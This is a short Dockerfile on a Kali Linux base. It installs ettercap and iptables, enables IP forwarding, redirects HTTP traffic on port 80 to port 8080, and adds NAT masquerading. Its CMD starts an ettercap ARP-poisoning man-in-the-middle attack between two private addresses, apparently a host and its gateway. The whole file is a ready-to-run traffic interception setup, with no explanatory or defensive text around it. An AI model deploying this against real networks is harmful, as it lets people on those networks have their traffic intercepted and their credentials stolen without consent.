FROM kalilinux/kali-rolling
RUN apt update && apt install -y iptables ettercap-text-only
RUN echo 1 > /proc/sys/net/ipv4/ip_forward && \
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 && \
    iptables -t nat -A POSTROUTING -j MASQUERADE

CMD ["ettercap", "-T", "-M", "arp:remote", "/192.168.1.2//", "/192.168.1.1//"]
